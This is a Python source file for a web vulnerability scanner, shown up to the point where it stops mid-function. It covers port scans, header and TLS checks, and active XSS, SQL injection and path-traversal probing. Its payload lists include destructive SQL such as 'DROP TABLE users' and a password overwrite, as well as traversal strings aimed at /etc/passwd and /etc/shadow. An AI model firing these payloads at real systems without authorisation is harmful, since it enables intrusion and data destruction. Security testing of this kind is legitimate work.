#!/usr/bin/env python3

"""
Enhanced Production-Ready Vulnerability Scanner
A sophisticated web security scanner with real-time capabilities and professional features.
"""

import asyncio
import json
import logging
import re
import socket
import subprocess
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse
import requests
import urllib3
from datetime import datetime, timedelta
import hashlib
import os
import sys
# Removed unused import that was causing issues

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Optional imports with graceful fallbacks
try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False
    logger.warning("nmap not available - port scanning will be limited")

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    logger.warning("BeautifulSoup4 not available - HTML parsing will be limited")

try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.cluster import KMeans
    SKLEARN_AVAILABLE = True
except ImportError:
    SKLEARN_AVAILABLE = False
    logger.warning("scikit-learn not available - ML features will be disabled")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SecurityTest:
    """Base class for security tests"""
    def __init__(self, name: str, description: str, severity: str):
        self.name = name
        self.description = description
        self.severity = severity
        self.start_time = None
        self.end_time = None
        self.result = None
        self.error = None
        
    def __str__(self):
        return f"{self.name}: {self.description}"

class EnhancedVulnerabilityScanner:
    """Enhanced production-ready vulnerability scanner with real-time capabilities"""
    
    def __init__(self, target: str, max_workers: int = None, timeout: int = None):
        self.original_target = target
        self.target = self._normalize_target(target)
        self.domain = self._extract_domain(self.target)
        
        # Get dynamic configuration
        try:
            from dynamic_config import get_dynamic_config
            self.dynamic_config = get_dynamic_config(self.target)
            self.max_workers = max_workers or self.dynamic_config.get('workers', 10)
            self.timeout = timeout or self.dynamic_config.get('timeout', 30)
            logger.info(f"Using dynamic config: workers={self.max_workers}, timeout={self.timeout}")
        except ImportError:
            logger.warning("Dynamic config not available, using defaults")
            self.max_workers = max_workers or 10
            self.timeout = timeout or 30
            self.dynamic_config = None
        
        self.session = self._create_session()
        self.scan_id = self._generate_scan_id()
        self.start_time = datetime.now()
        self.progress_callback = None
        self.cache = {}
        self.scan_results = {}
        
        logger.info(f"Initialized scanner for target: {self.target} (domain: {self.domain})")
    
    def _normalize_target(self, target: str) -> str:
        """Normalize target URL to ensure proper format with enhanced security validation"""
        if not target:
            raise ValueError("Target URL cannot be empty")
        
        # Remove any whitespace and limit length
        target = target.strip()
        if len(target) > 2048:  # Reasonable URL length limit
            raise ValueError("Target URL too long")
        
        # Security: Prevent malicious characters
        dangerous_chars = ['<', '>', '"', "'", '`', '|', '&', ';', '$', '(', ')', '{', '}', '[', ']']
        if any(char in target for char in dangerous_chars):
            raise ValueError("Target URL contains invalid characters")
        
        # Security: Check for dangerous URL schemes before adding protocol
        dangerous_schemes = ['javascript:', 'data:', 'file:', 'ftp:', 'vbscript:', 'about:']
        target_lower = target.lower()
        if any(scheme in target_lower for scheme in dangerous_schemes):
            raise ValueError("Dangerous URL scheme detected")
        
        # Add protocol if missing
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        # Validate URL format
        parsed = urlparse(target)
        if not parsed.netloc:
            raise ValueError(f"Invalid URL format: {target}")
        
        # Security: Validate URL scheme (double-check after protocol addition)
        allowed_schemes = ['http', 'https']
        if parsed.scheme not in allowed_schemes:
            raise ValueError(f"Unsupported URL scheme: {parsed.scheme}")
        
        # Security: Prevent local/private IP scanning
        import ipaddress
        # Extract hostname/IP from netloc
        hostname = parsed.hostname
        if hostname:
            # Check if it's an IP address
            try:
                ip = ipaddress.ip_address(hostname)
                # Block private/local IPs
                if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_multicast:
                    raise ValueError("Scanning private/local IP addresses is not allowed")
            except (ipaddress.AddressValueError, ValueError) as e:
                # If it's not an IP address, treat it as hostname and check for localhost patterns
                if "does not appear to be an IPv4 or IPv6 address" in str(e):
                    # It's a hostname, check for localhost patterns
                    if hostname.lower() in ['localhost', '127.0.0.1', '::1'] or hostname.endswith('.local'):
                        raise ValueError("Scanning localhost is not allowed")
                else:
                    # Re-raise other ValueErrors (these are validation errors)
                    raise
        
        # Validate port if specified
        if parsed.port:
            if not (1 <= parsed.port <= 65535):
                raise ValueError("Invalid port number")
        
        return target
    
    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL"""
        parsed = urlparse(url)
        return parsed.netloc
    
    def _create_session(self) -> requests.Session:
        """Create HTTP session with proper security configuration"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'VulnScanner/2.0 (Professional Security Scanner)',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Security: Configure SSL verification
        # Allow disabling for testing, but warn about security implications
        disable_ssl = os.getenv('VULN_SCANNER_DISABLE_SSL_VERIFY', 'false').lower() == 'true'
        if disable_ssl:
            logger.warning("SSL verification disabled - this should only be used for testing")
            session.verify = False
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        else:
            session.verify = True
        
        # Security: Set timeouts to prevent hanging requests
        session.timeout = (5, 30)  # (connect_timeout, read_timeout)
        
        # Security: Configure SSL context for better security (when SSL verification is enabled)
        if not disable_ssl:
            import ssl
            try:
                # Configure session with SSL context
                session.mount('https://', requests.adapters.HTTPAdapter(max_retries=3))
            except Exception as e:
                logger.warning(f"Failed to configure SSL context: {e}")
                # Fall back to basic SSL verification
                session.verify = True
        
        return session
    
    def _generate_scan_id(self) -> str:
        """Generate cryptographically secure unique scan ID"""
        import secrets
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Use cryptographically secure random instead of predictable hash
        random_suffix = secrets.token_hex(8)
        return f"scan_{timestamp}_{random_suffix}"
    
    def set_progress_callback(self, callback):
        """Set callback function for progress updates"""
        self.progress_callback = callback
    
    def _update_progress(self, percentage: float, message: str):
        """Update scan progress"""
        if self.progress_callback:
            self.progress_callback(percentage, message)
        logger.info(f"Progress: {percentage:.1f}% - {message}")
    
    def _get_adaptive_delay(self, test_type: str) -> float:
        """Get adaptive delay for a specific test type"""
        if self.dynamic_config:
            try:
                from dynamic_config import get_adaptive_delay
                return get_adaptive_delay(self.target, test_type)
            except ImportError:
                pass
        
        # Fallback to static delays
        delays = {
            'vulnerability_scan': 0.2,
            'port_scan': 0.05,
            'directory_scan': 0.15,
            'header_scan': 0.05,
            'ssl_scan': 0.1,
            'technology_scan': 0.08,
            'information_disclosure': 0.1
        }
        return delays.get(test_type, 0.1)
    
    def _should_skip_test(self, test_type: str) -> tuple:
        """Check if a test should be skipped based on target characteristics"""
        if self.dynamic_config:
            try:
                from dynamic_config import should_skip_test
                return should_skip_test(self.target, test_type)
            except ImportError:
                pass
        
        return False, ""
    
    def _test_connectivity(self) -> Dict[str, Any]:
        """Test basic connectivity to target"""
        test_result = {
            'test_name': 'Connectivity Test',
            'status': 'running',
            'timestamp': datetime.now().isoformat(),
            'details': {}
        }
        
        try:
            # Test HTTP connectivity
            response = self.session.get(self.target, timeout=self.timeout)
            test_result['details']['http_status'] = response.status_code
            test_result['details']['response_time'] = response.elapsed.total_seconds()
            test_result['details']['server'] = response.headers.get('Server', 'Unknown')
            test_result['details']['content_length'] = len(response.content)
            test_result['status'] = 'success'
            
        except requests.exceptions.RequestException as e:
            test_result['status'] = 'error'
            test_result['error'] = str(e)
            logger.error(f"Connectivity test failed: {e}")
        
        return test_result
    
    def _port_scan(self) -> Dict[str, Any]:
        """Enhanced port scanning with nmap"""
        test_result = {
            'test_name': 'Port Scanning',
            'status': 'running',
            'timestamp': datetime.now().isoformat(),
            'details': {}
        }
        
        if not NMAP_AVAILABLE:
            # Fallback to basic socket scanning
            return self._basic_port_scan()
        
        try:
            nm = nmap.PortScanner()
            # Scan common ports with service detection
            scan_result = nm.scan(self.domain, '21-23,25,53,80,110,143,443,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443')
            
            if self.domain in scan_result['scan']:
                host_data = scan_result['scan'][self.domain]
                test_result['details']['host_state'] = host_data.get('status', {}).get('state', 'unknown')
                test_result['details']['open_ports'] = []
                
                for port in host_data.get('tcp', {}):
                    port_data = host_data['tcp'][port]
                    port_info = {
                        'port': port,
                        'state': port_data.get('state', 'unknown'),
                        'service': port_data.get('name', 'unknown'),
                        'version': port_data.get('version', 'unknown'),
                        'product': port_data.get('product', 'unknown')
                    }
                    if port_data.get('state') == 'open':
                        test_result['details']['open_ports'].append(port_info)
                
                test_result['status'] = 'success'
            else:
                test_result['status'] = 'error'
                test_result['error'] = 'No scan results for target'
                
        except Exception as e:
            test_result['status'] = 'error'
            test_result['error'] = str(e)
            logger.error(f"Port scanning failed: {e}")
        
        return test_result
    
    def _basic_port_scan(self) -> Dict[str, Any]:
        """Basic port scanning using sockets"""
        test_result = {
            'test_name': 'Basic Port Scanning',
            'status': 'running',
            'timestamp': datetime.now().isoformat(),
            'details': {'open_ports': []}
        }
        
        # Check if we should skip this test
        skip_test, skip_reason = self._should_skip_test('port_scan')
        if skip_test:
            test_result['status'] = 'skipped'
            test_result['skip_reason'] = skip_reason
            return test_result
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443]
        delay = self._get_adaptive_delay('port_scan')
        
        try:
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    
                    # Use dynamic timeout
                    timeout = min(self.timeout // 4, 10)
                    sock.settimeout(timeout)
                    
                    result = sock.connect_ex((self.domain, port))
                    if result == 0:
                        test_result['details']['open_ports'].append({
                            'port': port,
                            'state': 'open',
                            'service': self._get_service_name(port)
                        })
                    sock.close()
                    
                    # Adaptive delay between port checks
                    if delay > 0:
                        time.sleep(delay)
                        
                except Exception:
                    continue
            
            test_result['status'] = 'success'
            
        except Exception as e:
            test_result['status'] = 'error'
            test_result['error'] = str(e)
        
        return test_result
    
    def _get_service_name(self, port: int) -> str:
        """Get service name for port"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
            993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL', 1521: 'Oracle',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
            6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'
        }
        return services.get(port, 'Unknown')
    
    def _security_headers_check(self) -> Dict[str, Any]:
        """Check security headers"""
        test_result = {
            'test_name': 'Security Headers Analysis',
            'status': 'running',
            'timestamp': datetime.now().isoformat(),
            'details': {}
        }
        
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            
            # Security headers to check
            security_headers = {
                'Content-Security-Policy': 'CSP',
                'Strict-Transport-Security': 'HSTS',
                'X-Content-Type-Options': 'Content Type Options',
                'X-Frame-Options': 'Frame Options',
                'X-XSS-Protection': 'XSS Protection',
                'Referrer-Policy': 'Referrer Policy',
                'Permissions-Policy': 'Permissions Policy',
                'Feature-Policy': 'Feature Policy'
            }
            
            headers_analysis = {}
            for header, description in security_headers.items():
                value = response.headers.get(header)
                headers_analysis[header] = {
                    'present': value is not None,
                    'value': value,
                    'description': description,
                    'recommendation': self._get_header_recommendation(header, value)
                }
            
            test_result['details']['headers'] = headers_analysis
            test_result['details']['missing_headers'] = [
                header for header, data in headers_analysis.items() 
                if not data['present']
            ]
            test_result['status'] = 'success'
            
        except Exception as e:
            test_result['status'] = 'error'
            test_result['error'] = str(e)
            logger.error(f"Security headers check failed: {e}")
        
        return test_result
    
    def _get_header_recommendation(self, header: str, value: str) -> str:
        """Get recommendation for security header"""
        if not value:
            return f"Implement {header} header for enhanced security"
        
        recommendations = {
            'Content-Security-Policy': 'Ensure CSP is restrictive and blocks unsafe-inline/unsafe-eval',
            'Strict-Transport-Security': 'Ensure HSTS has sufficient max-age and includeSubDomains',
            'X-Content-Type-Options': 'Should be set to "nosniff"',
            'X-Frame-Options': 'Should be set to "DENY" or "SAMEORIGIN"',
            'X-XSS-Protection': 'Should be set to "1; mode=block"',
            'Referrer-Policy': 'Should be set to "strict-origin-when-cross-origin" or stricter',
            'Permissions-Policy': 'Review and restrict permissions as needed'
        }
        
        return recommendations.get(header, 'Review configuration')
    
    def _ssl_analysis(self) -> Dict[str, Any]:
        """Analyze SSL/TLS configuration"""
        test_result = {
            'test_name': 'SSL/TLS Analysis',
            'status': 'running',
            'timestamp': datetime.now().isoformat(),
            'details': {}
        }
        
        try:
            if not self.target.startswith('https://'):
                test_result['status'] = 'skipped'
                test_result['reason'] = 'Target does not use HTTPS'
                return test_result
            
            response = self.session.get(self.target, timeout=self.timeout)
            
            # Basic SSL information
            test_result['details']['ssl_enabled'] = True
            test_result['details']['redirects_to_https'] = response.url.startswith('https://')
            
            # Check for mixed content warnings
            if BS4_AVAILABLE:
                soup = BeautifulSoup(response.content, 'html.parser')
                http_resources = []
                
                # Check for HTTP resources in HTTPS page
                for tag in soup.find_all(['img', 'script', 'link', 'iframe']):
                    src = tag.get('src') or tag.get('href')
                    if src and src.startswith('http://'):
                        http_resources.append(src)
                
                test_result['details']['mixed_content_issues'] = http_resources
                test_result['details']['has_mixed_content'] = len(http_resources) > 0
            
            test_result['status'] = 'success'
            
        except Exception as e:
            test_result['status'] = 'error'
            test_result['error'] = str(e)
            logger.error(f"SSL analysis failed: {e}")
        
        return test_result
    
    def _vulnerability_scan(self) -> Dict[str, Any]:
        """Comprehensive vulnerability scanning with sophisticated detection"""
        test_result = {
            'test_name': 'Vulnerability Scanning',
            'status': 'running',
            'timestamp': datetime.now().isoformat(),
            'details': {'vulnerabilities': []}
        }
        
        try:
            # Get forms and inputs for more sophisticated testing
            forms_data = self._discover_forms()
            
            # XSS Detection with multiple contexts
            xss_result = self._test_xss_comprehensive(forms_data)
            if xss_result['vulnerable']:
                test_result['details']['vulnerabilities'].append({
                    'type': 'Cross-Site Scripting (XSS)',
                    'severity': 'High',
                    'description': f'XSS vulnerability detected in {xss_result["context"]}',
                    'details': xss_result,
                    'remediation': 'Implement proper input validation and output encoding'
                })
            
            # SQL Injection Detection with advanced techniques
            sqli_result = self._test_sql_injection_advanced(forms_data)
            if sqli_result['vulnerable']:
                test_result['details']['vulnerabilities'].append({
                    'type': 'SQL Injection',
                    'severity': 'Critical',
                    'description': f'SQL injection vulnerability detected using {sqli_result["technique"]}',
                    'details': sqli_result,
                    'remediation': 'Use parameterized queries and input validation'
                })
            
            # Directory Traversal with encoding variations
            dir_traversal_result = self._test_directory_traversal_advanced(forms_data)
            if dir_traversal_result['vulnerable']:
                test_result['details']['vulnerabilities'].append({
                    'type': 'Directory Traversal',
                    'severity': 'High',
                    'description': 'Directory traversal vulnerability detected',
                    'details': dir_traversal_result,
                    'remediation': 'Implement proper file path validation and sanitization'
                })
            
            # Command Injection Testing
            cmd_injection_result = self._test_command_injection(forms_data)
            if cmd_injection_result['vulnerable']:
                test_result['details']['vulnerabilities'].append({
                    'type': 'Command Injection',
                    'severity': 'Critical',
                    'description': 'Command injection vulnerability detected',
                    'details': cmd_injection_result,
                    'remediation': 'Avoid executing user input as system commands'
                })
            
            # CSRF Testing
            csrf_result = self._test_csrf(forms_data)
            if csrf_result['vulnerable']:
                test_result['details']['vulnerabilities'].append({
                    'type': 'Cross-Site Request Forgery (CSRF)',
                    'severity': 'Medium',
                    'description': 'CSRF vulnerability detected',
                    'details': csrf_result,
                    'remediation': 'Implement CSRF tokens and proper request validation'
                })
            
            # File Upload Testing
            if forms_data.get('file_upload_forms'):
                upload_result = self._test_file_upload_vulnerabilities(forms_data['file_upload_forms'])
                if upload_result['vulnerable']:
                    test_result['details']['vulnerabilities'].append({
                        'type': 'File Upload Vulnerability',
                        'severity': 'High',
                        'description': 'Insecure file upload detected',
                        'details': upload_result,
                        'remediation': 'Implement file type validation and secure file storage'
                    })
            
            # Authentication Bypass Testing
            auth_bypass_result = self._test_authentication_bypass()
            if auth_bypass_result['vulnerable']:
                test_result['details']['vulnerabilities'].append({
                    'type': 'Authentication Bypass',
                    'severity': 'Critical',
                    'description': 'Authentication bypass vulnerability detected',
                    'details': auth_bypass_result,
                    'remediation': 'Implement proper authentication and session management'
                })
            
            test_result['status'] = 'success'
            
        except Exception as e:
            test_result['status'] = 'error'
            test_result['error'] = str(e)
            logger.error(f"Vulnerability scanning failed: {e}")
        
        return test_result
    
    def _discover_forms(self) -> Dict[str, Any]:
        """Discover forms and inputs for comprehensive testing"""
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            
            if not BS4_AVAILABLE:
                # Basic form discovery without BeautifulSoup
                forms_data = {
                    'forms': [],
                    'inputs': [],
                    'file_upload_forms': [],
                    'has_forms': '<form' in response.text.lower()
                }
                
                # Try to find basic form patterns
                import re
                form_pattern = r'<form[^>]*>(.*?)</form>'
                forms = re.findall(form_pattern, response.text, re.DOTALL | re.IGNORECASE)
                
                for form in forms:
                    form_data = {
                        'action': '',
                        'method': 'GET',
                        'inputs': [],
                        'has_file_upload': 'type="file"' in form.lower()
                    }
                    
                    # Extract action
                    action_match = re.search(r'action\s*=\s*["\']([^"\']*)["\']', form, re.IGNORECASE)
                    if action_match:
                        form_data['action'] = action_match.group(1)
                    
                    # Extract method
                    method_match = re.search(r'method\s*=\s*["\']([^"\']*)["\']', form, re.IGNORECASE)
                    if method_match:
                        form_data['method'] = method_match.group(1).upper()
                    
                    # Extract inputs
                    input_pattern = r'<input[^>]*>'
                    inputs = re.findall(input_pattern, form, re.IGNORECASE)
                    
                    for inp in inputs:
                        input_data = {'name': '', 'type': 'text', 'value': ''}
                        
                        name_match = re.search(r'name\s*=\s*["\']([^"\']*)["\']', inp, re.IGNORECASE)
                        if name_match:
                            input_data['name'] = name_match.group(1)
                        
                        type_match = re.search(r'type\s*=\s*["\']([^"\']*)["\']', inp, re.IGNORECASE)
                        if type_match:
                            input_data['type'] = type_match.group(1)
                        
                        value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', inp, re.IGNORECASE)
                        if value_match:
                            input_data['value'] = value_match.group(1)
                        
                        form_data['inputs'].append(input_data)
                    
                    forms_data['forms'].append(form_data)
                    
                    if form_data['has_file_upload']:
                        forms_data['file_upload_forms'].append(form_data)
                
                return forms_data
            
            # Advanced form discovery with BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            forms_data = {
                'forms': [],
                'inputs': [],
                'file_upload_forms': [],
                'has_forms': bool(soup.find_all('form'))
            }
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': [],
                    'has_file_upload': False
                }
                
                # Find all inputs, textareas, and selects
                for input_elem in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_elem.get('name', ''),
                        'type': input_elem.get('type', 'text'),
                        'value': input_elem.get('value', ''),
                        'element_type': input_elem.name
                    }
                    
                    if input_data['type'] == 'file':
                        form_data['has_file_upload'] = True
                    
                    form_data['inputs'].append(input_data)
                
                forms_data['forms'].append(form_data)
                
                if form_data['has_file_upload']:
                    forms_data['file_upload_forms'].append(form_data)
            
            return forms_data
            
        except Exception as e:
            logger.error(f"Form discovery failed: {e}")
            return {
                'forms': [],
                'inputs': [],
                'file_upload_forms': [],
                'has_forms': False,
                'error': str(e)
            }
    
    def _test_xss_comprehensive(self, forms_data: Dict[str, Any]) -> Dict[str, Any]:
        """Comprehensive XSS testing with multiple contexts and payloads"""
        payloads = [
            # Basic XSS payloads
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src=javascript:alert("XSS")>',
            
            # Context-breaking payloads
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '</script><script>alert("XSS")</script>',
            '</textarea><script>alert("XSS")</script>',
            
            # Event-based payloads
            '<div onmouseover=alert("XSS")>test</div>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            
            # Encoded payloads
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            '%3Cscript%3Ealert("XSS")%3C/script%3E',
            '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
            
            # CSS-based payloads
            '<style>@import"javascript:alert(\\"XSS\\")";</style>',
            '<div style="background:url(javascript:alert(\'XSS\'))">',
            
            # Filter bypass payloads
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src="javascript:alert(\'XSS\')">',
            'javascript:alert("XSS")',
            
            # Modern browser payloads
            '<svg><script>alert("XSS")</script></svg>',
            '<math><script>alert("XSS")</script></math>',
            '<table background=javascript:alert("XSS")>',
            '<object data=javascript:alert("XSS")>',
        ]
        
        result = {
            'vulnerable': False,
            'payloads_tested': len(payloads),
            'responses': [],
            'context': 'URL parameters',
            'vulnerability_type': 'Reflected XSS'
        }
        
        try:
            # Test URL parameters
            for payload in payloads:
                test_url = f"{self.target}?q={payload}&search={payload}&test={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                if payload in response.text or payload.replace('"', '&quot;') in response.text:
                    result['vulnerable'] = True
                    result['responses'].append({
                        'payload': payload,
                        'reflected': True,
                        'url': test_url,
                        'context': 'URL parameter'
                    })
                    break
            
            # Test forms if available
            if not result['vulnerable'] and forms_data.get('forms'):
                for form in forms_data['forms']:
                    if not form['inputs']:
                        continue
                        
                    form_url = self.target
                    if form['action']:
                        if form['action'].startswith('http'):
                            form_url = form['action']
                        else:
                            form_url = f"{self.target.rstrip('/')}/{form['action'].lstrip('/')}"
                    
                    for payload in payloads[:10]:  # Test subset for forms
                        form_data = {}
                        
                        for input_field in form['inputs']:
                            if input_field['name'] and input_field['type'] not in ['submit', 'button', 'hidden']:
                                form_data[input_field['name']] = payload
                        
                        if not form_data:
                            continue
                        
                        try:
                            if form['method'] == 'POST':
                                response = self.session.post(form_url, data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                            
                            if payload in response.text or payload.replace('"', '&quot;') in response.text:
                                result['vulnerable'] = True
                                result['context'] = 'Form input'
                                result['responses'].append({
                                    'payload': payload,
                                    'reflected': True,
                                    'url': form_url,
                                    'context': 'Form input',
                                    'form_method': form['method']
                                })
                                break
                        except Exception as e:
                            logger.debug(f"Form XSS test failed: {e}")
                            continue
                    
                    if result['vulnerable']:
                        break
                
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"XSS testing failed: {e}")
        
        return result
    
    def _test_sql_injection_advanced(self, forms_data: Dict[str, Any]) -> Dict[str, Any]:
        """Advanced SQL injection testing with multiple techniques"""
        payloads = [
            # Boolean-based blind SQL injection
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 --",
            "' OR 1=1 #",
            
            # Union-based SQL injection
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT null,null,null --",
            "' UNION ALL SELECT 1,2,3 --",
            "' UNION SELECT @@version,2,3 --",
            
            # Time-based blind SQL injection
            "'; WAITFOR DELAY '00:00:05' --",
            "' OR SLEEP(5) --",
            "' OR pg_sleep(5) --",
            "'; SELECT SLEEP(5) --",
            
            # Error-based SQL injection
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) --",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
            
            # Stack-based SQL injection
            "'; DROP TABLE users; --",
            "'; INSERT INTO users VALUES ('test','test'); --",
            "'; UPDATE users SET password='test' WHERE id=1; --",
            
            # NoSQL injection
            "'; return this.a == 1; var x = '",
            "'; return this.a != 1; var x = '",
            "'; return /.*/.test(this.a); var x = '",
            
            # Different database syntaxes
            "' OR 1=1 LIMIT 1 --",  # MySQL
            "' OR 1=1 OFFSET 1 --",  # PostgreSQL
            "' OR 1=1; SELECT * FROM dual --",  # Oracle
            "' OR 1=1; SELECT TOP 1 * FROM users --",  # SQL Server
        ]
        
        result = {
            'vulnerable': False,
            'payloads_tested': len(payloads),
            'responses': [],
            'technique': 'Error-based detection',
            'database_type': 'Unknown'
        }
        
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'ora-', 'microsoft jet database', 'odbc drivers error',
            'postgresql', 'warning: mysql', 'mysql error', 'ora-00', 'microsoft odbc',
            'error in your sql syntax', 'mysql_query()', 'pg_query()', 'sqlite_query()',
            'database error', 'sql command not properly ended', 'quoted string not properly terminated',
            'unclosed quotation mark', 'syntax error', 'ora-01756', 'sqlstate',
            'column count doesn\'t match value count', 'unknown column', 'division by zero',
            'duplicate entry', 'data truncated', 'subquery returns more than 1 row'
        ]
        
        try:
            # Test URL parameters
            for payload in payloads:
                test_url = f"{self.target}?id={payload}&user={payload}&search={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                response_lower = response.text.lower()
                
                for error in sql_errors:
                    if error in response_lower:
                        result['vulnerable'] = True
                        result['technique'] = 'Error-based detection'
                        result['responses'].append({
                            'payload': payload,
                            'error_found': error,
                            'url': test_url,
                            'context': 'URL parameter'
                        })
                        
                        # Try to identify database type
                        if 'mysql' in error or 'mysql' in response_lower:
                            result['database_type'] = 'MySQL'
                        elif 'postgresql' in error or 'postgres' in response_lower:
                            result['database_type'] = 'PostgreSQL'
                        elif 'oracle' in error or 'ora-' in error:
                            result['database_type'] = 'Oracle'
                        elif 'microsoft' in error or 'sql server' in response_lower:
                            result['database_type'] = 'SQL Server'
                        elif 'sqlite' in error:
                            result['database_type'] = 'SQLite'
                        
                        break
                
                if result['vulnerable']:
                    break
            
            # Test forms if available and not already vulnerable
            if not result['vulnerable'] and forms_data.get('forms'):
                for form in forms_data['forms']:
                    if not form['inputs']:
                        continue
                        
                    form_url = self.target
                    if form['action']:
                        if form['action'].startswith('http'):
                            form_url = form['action']
                        else:
                            form_url = f"{self.target.rstrip('/')}/{form['action'].lstrip('/')}"
                    
                    for payload in payloads[:15]:  # Test subset for forms
                        form_data = {}
                        
                        for input_field in form['inputs']:
                            if input_field['name'] and input_field['type'] not in ['submit', 'button', 'file']:
                                form_data[input_field['name']] = payload
                        
                        if not form_data:
                            continue
                        
                        try:
                            if form['method'] == 'POST':
                                response = self.session.post(form_url, data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                            
                            response_lower = response.text.lower()
                            
                            for error in sql_errors:
                                if error in response_lower:
                                    result['vulnerable'] = True
                                    result['technique'] = 'Error-based detection via form'
                                    result['responses'].append({
                                        'payload': payload,
                                        'error_found': error,
                                        'url': form_url,
                                        'context': 'Form input',
                                        'form_method': form['method']
                                    })
                                    break
                            
                            if result['vulnerable']:
                                break
                        except Exception as e:
                            logger.debug(f"Form SQL injection test failed: {e}")
                            continue
                    
                    if result['vulnerable']:
                        break
                
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"SQL injection testing failed: {e}")
        
        return result
    
    def _test_directory_traversal_advanced(self, forms_data: Dict[str, Any]) -> Dict[str, Any]:
        """Advanced directory traversal testing with multiple encoding techniques"""
        payloads = [
            # Basic directory traversal
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../etc/shadow',
            '../../../etc/group',
            '../../../proc/version',
            '../../../etc/issue',
            
            # Double encoding
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
            
            # Unicode encoding
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
            
            # Mixed encoding
            '....//....//....//etc/passwd',
            '....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts',
            
            # Null byte injection
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',
            '../../../etc/passwd%00.txt',
            
            # Prefix bypass
            '/var/www/html/../../../etc/passwd',
            'files/../../../etc/passwd',
            'images/../../../etc/passwd',
            
            # Different OS paths
            '../../../etc/passwd',  # Linux
            '..\\..\\..\\windows\\win.ini',  # Windows
            '../../../etc/master.passwd',  # BSD
            '../../../usr/local/etc/passwd',  # Some Unix
        ]
        
        result = {
            'vulnerable': False,
            'payloads_tested': len(payloads),
            'responses': [],
            'files_accessed': [],
            'technique': 'Path traversal'
        }
        
        # Common file signatures
        file_signatures = [
            'root:', 'daemon:', 'bin:', 'sys:', 'adm:',  # /etc/passwd
            'localhost', '127.0.0.1', '::1',  # hosts file
            'for 16-bit app support', '[fonts]', '[extensions]',  # win.ini
            'Linux version', 'Darwin Kernel Version',  # version files
            'root:$', 'daemon:$', 'bin:$'  # shadow file
        ]
        
        try:
            # Test URL parameters
            for payload in payloads:
                test_urls = [
                    f"{self.target}?file={payload}",
                    f"{self.target}?path={payload}",
                    f"{self.target}?page={payload}",
                    f"{self.target}?include={payload}",
                    f"{self.target}?view={payload}",
                    f"{self.target}?doc={payload}",
